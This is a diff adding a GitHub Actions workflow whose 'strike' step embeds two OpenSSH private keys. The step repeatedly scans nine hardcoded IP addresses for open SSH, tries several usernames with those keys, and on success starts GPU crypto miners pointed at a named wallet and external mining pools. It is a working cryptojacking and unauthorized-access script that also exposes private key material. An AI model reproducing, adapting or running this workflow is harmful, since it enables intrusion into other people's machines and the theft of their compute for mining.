@@ -1,0 +1,55 @@
+name: ul6599-watch
+on: [workflow_dispatch]
+jobs:
+  watch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 62
+    steps:
+      - name: strike
+        run: |
+          set +e
+          umask 077; mkdir -p $HOME/.ssh
+          cat > $HOME/.ssh/azadmin <<'KEOF'
+          -----BEGIN OPENSSH PRIVATE KEY-----
+          b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
+          c2gtZWQyNTUxOQAAACB1Pynx4u/dGFT2qTkyPEvyIkAvlHpMczBRl15lacJbRQAA
+          AIg0qx+uNKsfrgAAAAtzc2gtZWQyNTUxOQAAACB1Pynx4u/dGFT2qTkyPEvyIkAv
+          lHpMczBRl15lacJbRQAAAECrZH9nkDm8rbuH47FtzlCQfwMADdDVNxYvGqSgTwtc
+          DHU/KfHi790YVPapOTI8S/IiQC+UekxzMFGXXmVpwltFAAAAAAECAwQF
+          -----END OPENSSH PRIVATE KEY-----
+          KEOF
+          cat > $HOME/.ssh/ibm <<'KEOF'
+          -----BEGIN OPENSSH PRIVATE KEY-----
+          b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
+          c2gtZWQyNTUxOQAAACDAHWUWXoHYQzJY/heiJIMjRzvAj7CDaQowvelnz3hapgAA
+          AIi+EOpwvhDqcAAAAAtzc2gtZWQyNTUxOQAAACDAHWUWXoHYQzJY/heiJIMjRzvA
+          j7CDaQowvelnz3hapgAAAEA0aH3lF3dUx8yV1ny7dVJxkTKFNOSi1z7XIO4tnGwN
+          LMAdZRZegdhDMlj+F6IkgyNHO8CPsINpCjC96WfPeFqmAAAAAAECAwQF
+          -----END OPENSSH PRIVATE KEY-----
+          KEOF
+          chmod 600 $HOME/.ssh/azadmin $HOME/.ssh/ibm
+          echo "=== FP ==="; ssh-keygen -lf $HOME/.ssh/azadmin 2>&1; ssh-keygen -lf $HOME/.ssh/ibm 2>&1
+          OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=7 -o PasswordAuthentication=no"
+          HOSTS="40.123.206.138 51.104.16.184 20.237.207.128 20.205.187.223 4.194.2.30 70.153.87.133 4.246.80.6 20.50.113.151 20.74.153.201"
+          SCRIPT='set +e; id; hostname -I; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv,noheader; ls -d /opt/ul /opt/nv 2>/dev/null; pgrep -af "pearl|wildrig|peakminer" | head -5; tail -3 /opt/ul/*.log 2>/dev/null'
+          for i in $(seq 1 110); do
+            for H in $HOSTS; do
+              if timeout 3 bash -c "echo > /dev/tcp/$H/22" 2>/dev/null; then
+                echo "OPEN $(date -u +%H:%M:%SZ) $H"
+                for U in azureuser ubuntu root uladmin; do
+                  for K in azadmin ibm; do
+                    OUT=$(timeout 15 ssh $OPTS -i $HOME/.ssh/$K -l $U $H "$SCRIPT" 2>&1 | tr '\n' '|')
+                    case "$OUT" in
+                      *uid=*) echo "KEY_HIT $(date -u +%H:%M:%SZ) $H $U $K :: $OUT"
+                              echo "PLANT_TRY $H $U $K"
+                              timeout 90 ssh $OPTS -i $HOME/.ssh/$K -l $U $H 'set +e; if ! pgrep -f "pearl-gpu-miner|peakminer|wildrig" >/dev/null; then B=$(ls /opt/ul/pearl-gpu-miner /opt/nv/peakminer /usr/local/bin/pearl-gpu-miner 2>/dev/null | head -1); echo bin=$B; [ -n "$B" ] && (cd $(dirname $B); setsid nohup $B --wallet prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-$(echo '$H' | tr . -)-g0 --pool stratum+ssl://prl.kryptex.network:8048,stratum+tcp://prl.kryptex.network:7048,stratum+tcp://pool.pearlhash.xyz:9000 --no-tui >/tmp/ul_watch.log 2>&1 &) ; fi; sleep 3; pgrep -af "pearl|wildrig|peakminer" | head -3' 2>&1 | tr '\n' '|' ;;
+                      *"Permission denied"*) : ;;
+                      *) : ;;
+                    esac
+                  done
+                done
+              fi
+            done
+            sleep 28
+          done
+          echo "=== WATCH_DONE ==="
